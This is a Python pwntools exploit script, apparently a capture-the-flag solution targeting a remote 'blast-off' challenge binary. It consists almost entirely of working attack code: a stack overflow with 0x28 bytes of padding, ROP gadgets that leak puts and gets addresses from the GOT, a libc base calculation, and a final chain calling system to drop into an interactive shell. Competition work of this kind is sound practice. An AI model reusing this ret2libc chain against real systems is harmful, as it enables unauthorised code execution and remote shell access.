#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 0
filename = "./pwn"
if LOCAL:
    io = process(filename)
else:
    io = remote("spaceheroes-blast-off.chals.io", 443, ssl=True, sni="spaceheroes-blast-off.chals.io")

rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass

strange = 0x4006b6
puts_plt = 0x400690
brop_gadget = 0x400b4a
b_off_got = 0x602038
main_addr = 0x400991
padding_len = 0x28
pop_rdi_ret = brop_gadget + 0x9
pop_rsi_r15_ret = brop_gadget + 0x7
puts_got = 0x201982 + puts_plt + 6
gets_got = 0x602040

ru(b'enter the launch codes to start: \n')
payload = b"a"*padding_len
payload += p64(pop_rdi_ret) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)
sl(payload)
puts_addr = uu64(ru(b"\nPlease", "drop"))
lg("puts_addr")

#  ru(b'enter the launch codes to start: \n')
#  payload = b"a"*padding_len
#  payload += p64(pop_rdi_ret) + p64(b_off_got)
#  payload += p64(puts_plt)
#  payload += p64(main_addr)
#  sl(payload)
#  blast_addr = uu64(ru(b"\nPlease", "drop"))
#  lg("blast_addr")

ru(b'enter the launch codes to start: \n')
payload = b"a"*padding_len
payload += p64(pop_rdi_ret) + p64(gets_got)
payload += p64(puts_addr)
payload += p64(main_addr)
sl(payload)
gets_addr = uu64(ru(b"\nPlease", "drop"))
lg("gets_addr")

libc_base = puts_addr - 0x80970

ru(b'enter the launch codes to start: \n')
payload = b"a"*padding_len
payload += p64(pop_rdi_ret) + p64(0x602500)
payload += p64(gets_addr)
#  payload += p64(puts_addr)
payload += p64(main_addr)
sl(payload)
sl(b"/bin/sdsa\x00")

ru(b'enter the launch codes to start: \n')
payload = b"a"*padding_len
payload += p64(pop_rdi_ret) + p64(libc_base+0x1b3d88)
payload += p64(pop_rdi_ret+1)
payload += p64(libc_base+0x4f420)
#  payload += p64(main_addr)
sl(payload)



ia()
